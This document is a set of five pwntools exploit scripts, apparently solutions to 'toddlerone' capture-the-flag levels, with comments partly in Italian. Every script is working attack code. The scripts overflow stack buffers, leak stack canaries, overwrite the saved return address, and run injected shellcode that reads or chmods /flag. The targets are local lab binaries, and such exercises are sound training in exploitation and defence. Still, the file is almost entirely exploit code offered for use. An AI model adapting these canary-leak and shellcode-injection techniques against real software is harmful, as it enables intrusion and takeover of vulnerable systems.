#tod1

from pwn import *

context.arch = 'amd64'

# Avvia il processo
p = process('/challenge/toddlerone-level-1-0')

# 1. Shellcode (cat /flag)
shellcode = asm(shellcraft.cat('/flag'))
# Inviamo esattamente 0x1000 byte riempiendo di NOP
p.send(shellcode.ljust(0x1000, b'\x90'))

# 2. Offset e Indirizzo
offset = 104
target_addr = 0x159cd000
payload = b"A" * offset + p64(target_addr)

# 3. INVIO DELLA LUNGHEZZA 
# Il programma aspetta di sapere quanti byte invierai.
# Inviamo la lunghezza del payload seguita da un newline.
p.sendline(str(len(payload)).encode())

# 4. Invio del Payload vero e proprio
log.info(f"Invio payload di {len(payload)} byte per sovrascrivere RIP con {hex(target_addr)}")
p.send(payload)

# Ricevi la flag
p.interactive()

#-------------------------tod2
#!/usr/bin/python3
from pwn import *
context.arch='amd64'
context.log_level='CRITICAL'

elf = ELF('/challenge/toddlerone-level-2-0')
io = elf.process(setuid=False)
io.sendline("512")
io.sendline(cyclic(512,n=8))
io.wait()
buff_len= cyclic_find(io.corefile.fault_addr, n=8)

io = elf.process()
io.recvuntil(b'The input buffer begins at 0x')
shellcode_address = p64(int(io.recvuntil(b',').decode()[:-1],16) + buff_len+8)

SHELLCODE = asm(shellcraft.cat('/flag'))
PADDING = (b'A' * buff_len) 

PAYLOAD = PADDING + shellcode_address + SHELLCODE

io.sendline(f'{len(PAYLOAD)}')
io.sendline(PAYLOAD)
io.interactive()


#----------------------------tod3
#!/usr/bin/python3
from pwn import *

# INITIALIZATION

# Set the architecture to amd64
context.arch = 'amd64'

# Load the ELF binary for the challenge
elf = ELF('/challenge/toddlerone-level-3-0')

# VARIABLES

# Offset to the buffer from the start of the stack frame
buffer_offset = 0x48

# Offset to the canary value from the start of the buffer
canary_offset = 0x10

# Calculate the distance between canary and buffer
canary_distance = buffer_offset - canary_offset
print(canary_distance)
# LEAKING CANARY

# Start a process for the ELF binary
io = elf.process()

# Read until prompted for payload size and send a payload to leak the canary value
io.readuntil('Payload size: ')
io.sendline(f'{canary_distance+1}'.encode())

# Craft a payload to leak the canary value
PAYLOAD = b'A' * (canary_distance - 6) + b'REPEAT' + b'B'

# Send the payload and extract the leaked canary value from the response
io.readuntil(b'bytes)!')
io.sendline(PAYLOAD)
io.recvuntil(b'REPEATB')
canary = b'\x00' + io.recvline().strip()[:7]

# EXPLOIT

# Read the buffer address from the output
io.readuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)

# Increase payload size and craft the final exploit payload
io.readuntil('Payload size: ')
io.sendline(f'{canary_distance + 24}'.encode())

# Craft shellcode to read the flag and create the final payload
#shellcode = asm(shellcraft.cat('/flag'))

file_path = "/flag"

# Imposta i permessi su rwx per tutti gli utenti
chmod_code = shellcraft.chmod(file_path, 0o777)

# Esegui il codice assembly
shellcode = asm(chmod_code)
add =  0x0000555f1ce4d2ad 



print(len(shellcode))
PAYLOAD = shellcode + b'A' * (canary_distance - len(shellcode)) + canary + b'B' * 8 + p64(buffer_addr)

# Send the final payload to the binary
io.readuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program to get the flag
print(io.recvall().decode("utf-8","ignore"))

#----------------------------tod4
from pwn import *

context.clear(arch='amd64', os='linux')

buffer_off  = 0x88
canary_off  = 0x10
exit_off    = 0x20

exit_value = 9609769369936157067  # 0x855cc253c479598b

exit_distance   = buffer_off - exit_off     # 0x68
canary_distance = buffer_off - canary_off   # 0x78

SHELLCODE = asm(shellcraft.cat('/flag'))

elf = ELF('/challenge/toddlerone-level-4-0')
io = elf.process()

# ---- stage 1: leak canary ----
io.recvuntil(b'Payload size: ')
PAYLOAD1 = b'A' * (canary_distance - 6) + b'REPEAT' + b'B'
io.sendline(str(len(PAYLOAD1)).encode())

io.recvuntil(b'bytes)!')
io.send(PAYLOAD1)

io.recvuntil(b'REPEATB')
canary = b'\x00' + io.recv(7)
log.success(f"Canary leaked: {hex(u64(canary))}")

# leak buffer addr
io.recvuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.recvuntil(b',')[:-1], 16)
log.success(f"Buffer addr: {hex(buffer_addr)}")

# ---- stage 2: smash stack (write exit_value + canary + RIP=buffer) ----
PAYLOAD2  = SHELLCODE
PAYLOAD2 += b'A' * (exit_distance - len(SHELLCODE))
PAYLOAD2 += p64(exit_value)
PAYLOAD2 += b'A' * (canary_distance - (exit_distance + 8))
PAYLOAD2 += canary
PAYLOAD2 += b'A' * 8                 # saved RBP
PAYLOAD2 += p64(buffer_addr)         # saved RIP -> shellcode in buffer

log.info(f"PAYLOAD2 len = {len(PAYLOAD2)} (should be 0x90 / 144)")

io.recvuntil(b'Payload size: ')
io.sendline(str(len(PAYLOAD2)).encode())

io.recvuntil(b'bytes)!')
io.send(PAYLOAD2)

print(io.recvall().decode('utf-8', 'ignore'))


#-----------------------------------tod5
from pwn import *


## init
context.arch = 'amd64'
buffer_off = 0x88
canary_off = 0x20
jail_off =  0x30

#exit_value = b'l\xb7f63293'
jail_value = 15746340677094049782

jail_distance = buffer_off-jail_off

canary_distance = buffer_off-canary_off

print(jail_distance)
print(canary_distance)
print(canary_distance- jail_distance)


SHELLCODE =asm(shellcraft.cat('/flag'))
elf = ELF('/challenge/toddlerone_level5.0')

io = elf.process()


io.readuntil('Payload size: ')
PAYLOAD1 = b'A'* (canary_distance -6) + b'REPEAT'+ b'B'
io.sendline(f'{len(PAYLOAD1)}'.encode())
io.readuntil(b'bytes)!')
io.sendline(PAYLOAD1)
io.recvuntil(b'REPEATB')
canary = b'\x00' + io.recvline().strip()[:7]
print(canary)

print(io.readuntil(b'The input buffer begins at 0x').decode())
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)
print(hex(buffer_addr))
PAYLOAD2 = SHELLCODE+ b'A'*((canary_distance-(len(SHELLCODE)))-(canary_distance- jail_distance))+p64(jail_value)  + b'A'*((jail_off-canary_off)-8)+canary+b'A'*(canary_off-8)+p64(buffer_addr)
# Increase payload size and craft the final exploit payload
io.readuntil('Payload size: ')
io.sendline(f'{len(PAYLOAD2)}'.encode())


# Send the final payload to the binary
io.readuntil(b'bytes)!')
io.sendline(PAYLOAD2)

# Print the output of the program to get the flag
print(io.recvall().decode("utf-8","ignore"))

